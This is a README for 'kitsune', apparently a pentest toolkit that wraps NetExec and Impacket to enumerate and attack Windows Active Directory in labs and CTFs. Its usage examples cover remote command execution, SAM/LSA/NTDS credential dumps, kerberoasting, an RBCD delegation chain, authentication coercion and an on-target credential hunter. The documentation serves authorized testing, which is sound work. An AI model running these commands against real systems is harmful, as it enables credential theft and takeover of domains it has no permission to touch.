# kitsune

Windows/Active Directory enumeration toolkit for **authorized** CTF, lab and
pentest-exam environments (self-supplied toolkit). 

kitsune automates the tedious credential/AD enumeration an operator does by
hand on a Kali box — it wraps `nxc`/NetExec and Impacket, validates a credential
across SMB/LDAP/WinRM/MSSQL/WMI, and *runs* the offensive primitives you ask for
by flag (remote command execution, credential dumps, the RBCD chain,
authentication coercion) — one action per flag, never automatically, never
chained into an exploit of its own.

## Scope & safety

- Authorized CTF, lab and pentest-exam use only. Enumeration and credential
  validation are the default; the offensive actions are opt-in flags (`--exec`,
  `--sam`, `--rbcd-attack`, `--coerce`, …). Nothing is triggered by another
  check's result, and nothing is chained: kitsune runs the action you named, on
  the target you named, and stops.
- Every external program runs through one shell layer: an argv list spawned
  directly, **never** `sh -c`/`cmd /c`, with a timeout and an output cap.
- Secrets are masked in the report by default: the credential, the
  machine-account password the RBCD chain creates, and whatever a wrapper echoes
  back. `sweep --reveal` (and the secret hunter's `-Reveal`) opts into plaintext
  when you want copy-pasteable creds — handy for CTFs where the report is just
  your own scratch notes. Reports written to a file are created with mode `0600`
  on Unix.
- Deterministic output: sorted JSON keys, `--no-timestamps` for byte-identical
  runs.


## Install

```bash
cd python-labkit
pip install -e .          # puts `kitsune` on PATH
kitsune --help
```

Or run without installing:

```bash
python -m kitsune --help
```

The only third-party dependency is `cryptography` (AES-256-CBC for GPP
`cpassword` decryption, used by `sweep --gpp`). Everything else is the standard
library, and it is imported lazily — kitsune runs fine without `cryptography`
unless you actually use `--gpp`.

kitsune only *orchestrates* the wrappers; install `netexec`/`nxc` and
`impacket` (and optionally `coercer`, `nmap`, `faketime`) on your attacker box
for the live checks. Missing wrappers are reported as `unavailable`, not errors.

## Commands

### `secret-hunter.ps1` — local filesystem secret hunter (PowerShell)

Scores candidate strings (not one regex) and reports likely credentials even
when `password`/`secret` is not nearby. Run it **on the target**:

```powershell
# copy secret-hunter.ps1 to the box, then:
.\secret-hunter.ps1 -Path C:\ -Out hunter.json
.\secret-hunter.ps1 -Path . -Reveal -Format md
.\secret-hunter.ps1 -Path . -Deny vendor -Deny node_modules -MinConfidence high
.\secret-hunter.ps1 -Path . -ContextNames admin,DC01,LAB
```

Parameters: `-Reveal`, `-Allow`/`-Deny` (repeatable path prefixes),
`-ContextNames` (comma list), `-MaxFileSize`, `-MaxFiles`, `-Timeout` (scan
budget, seconds), `-MinConfidence low|medium|high` (default medium),
`-Progress`, `-Format json|md`, `-Out FILE`, `-NoTimestamps`.


Pull the JSON back to your attacker box and feed it into the rest of the kit:

```bash
kitsune suggester --report hunter.json      
kitsune diff --before run1.json --after hunter.json
```

> **Local Windows enumeration is out of scope.** kitsune runs on your attacker
> box and works the target over the network; local privesc/host enumeration is
> better served by purpose-built on-target tools — run
> [PrivescCheck](https://github.com/itm4n/PrivescCheck) or winPEAS on the box
> itself, alongside `secret-hunter.ps1`.

### `sweep` — credential/AD sweep (NetExec/Impacket wrapper)

Validates a credential against SMB/LDAP/WinRM/MSSQL/WMI and enumerates what it
can see. `--target` accepts a comma-separated list; the run ends with a
`sweep.summary` and, when anything reusable turned up, a `sweep.loot` table
(domain, SID, host name, OS, SMB signing, AES keys).

```bash
kitsune sweep --target 10.0.0.5 --domain LAB --username user --password 'Summer2024!'
kitsune sweep --target 10.0.0.5 -u user --ntlm aad3b435b51404eeaad3b435b51404ee --protocol smb,ldap
kitsune sweep --target 10.0.0.5 -u user --ticket /tmp/ccache
kitsune sweep --target 10.0.0.5 -u user --password x --parse-file nxc.out
kitsune sweep --target 10.0.0.5,10.0.0.6 -u user -p x --asreproast --laps --gpp --rbcd
```

Short forms: `-d`/`-u`/`-p` for `--domain`/`--username`/`--password`.

Opt-in AD checks: `--spn` (GetUserSPNs), `--asreproast`, `--laps`, `--gpp` (with
a local `cpassword` decryptor), `--rbcd`. `--dc-ip` points the DC-oriented checks
at the domain controller while `--target` stays the host being enumerated.
`--local-auth` authenticates against the target's local accounts. `--fix-time`
probes the DC clock (nmap `smb2-time`) and runs every wrapper under `faketime` to
beat `KRB_AP_ERR_SKEW`; `--faketime <SPEC>` is the manual override. `--no-progress`
silences the per-step stderr progress. `--reveal` prints credentials in the clear
instead of masking them (also applies to `--parse-file`).

Transcript findings record *why* a logon was rejected (`STATUS_*`,
`KRB_AP_ERR_*`, `clock skew`), and the suggester turns each cause into one next
step.

#### Tier 1 — commands, dumps and tickets

```bash
kitsune sweep --target 10.0.0.5 -d LAB -u user -p 'Summer2024!' --exec 'whoami /all'
kitsune sweep --target 10.0.0.5 -d LAB -u user -p 'Summer2024!' --exec-ps 'Get-Process'
kitsune sweep --target 10.0.0.5 -d LAB -u user -p 'Summer2024!' --sam --lsa --ntds
kitsune sweep --target 10.0.0.5 -d LAB -u user -p 'Summer2024!' --secretsdump
kitsune sweep --target 10.0.0.5 -d LAB -u user -p 'Summer2024!' --kerberoast
```

SAM/LSA/NTDS dumps need local admin on the target; when SMB validation
authenticates but shows no `Pwn3d!`, the dump is *skipped* with that reason
instead of failing opaquely.

#### Tier 2 — AD attack chains

```bash
kitsune sweep --target 10.0.0.5 -d LAB -u user -p 'Summer2024!' \
  --rbcd-attack --machine 'ATTACK$' --machine-pass 'AttackPass1!' --delegate-to 'DC01$'

kitsune sweep --target 10.0.0.5 -d LAB -u user -p 'Summer2024!' --coerce 10.0.0.9
```

`--rbcd-attack` is three checks in order — `addcomputer` → `rbcd write` →
`getST` — stopping at the first that does not run. `--getst-spn` overrides the
`cifs/<delegate-to>` default; `--impersonate` picks the account (default
`administrator`). `--coerce` only *provokes*; catching the auth is your
`ntlmrelayx`/Responder session, outside kitsune.

### `plan` — run nothing, print the commands

```bash
kitsune plan --target 10.0.0.5 -d LAB -u user -p 'pass' --spn --kerberoast --secretsdump --format md
```

Same flags as `sweep` but **runs nothing** — prints the exact `nxc`/Impacket
command each action would issue as a note sheet (with the credential in the
clear, since it is your copy-pasteable sheet), followed by an empty block to
paste real output into. For exams/engagements where automation is disallowed:
you run each command yourself.

### `suggester` — passive next-step recommendations

```bash
kitsune sweep --target 10.0.0.5 -u user -p x --out sweep.json
kitsune suggester --report sweep.json         # analyze a saved report
kitsune sweep --target 10.0.0.5 -u user -p x --suggest   # or append inline
```

Reads sweep signals (which protocols a credential works on, why a logon was
rejected, SPNs, ASREP hashes) and the secret hunter's `secret_hunter.findings`
count from a saved report. Only *suggests* — the commands are for the operator to
run, never executed by kitsune.

### `run` — combined mode

```bash
kitsune run --target 10.0.0.5 -u user -p 'Summer2024!' --format md
```

sweep + suggester in one report. (Local secret hunting is the PowerShell script
above, run on the target.) The sweep part is skipped unless both `--target` and
`--username` plus a credential are given.

### `diff` — compare two saved reports

```bash
kitsune sweep --target 10.0.0.5 -u user -p x --out run1.json
# … lab reset …
kitsune sweep --target 10.0.0.5 -u user -p x --out run2.json
kitsune diff --before run1.json --after run2.json
```

Only `data` is compared; statuses and durations are a rendering of the payload.

## Report model

Every check has a status (`success`/`failed`/`unavailable`/`skipped`), the
backend that answered, structured `data`, an optional `error`, and the executed
command as `source`. JSON and Markdown are two views of the same data, carrying
a `schema_version` (currently **2**) for forward-compatible diffing.

## Layout

```
python-labkit/
  kitsune/            the Python package (CLI, model, shell, plugins)
    sweep/            sweep orchestration, wrappers, parsers, plan, gpp, clock, loot
  scripts/
    secret-hunter.ps1 the standalone PowerShell secret hunter
  pyproject.toml      `pip install -e .` -> the `kitsune` command
  requirements.txt
```
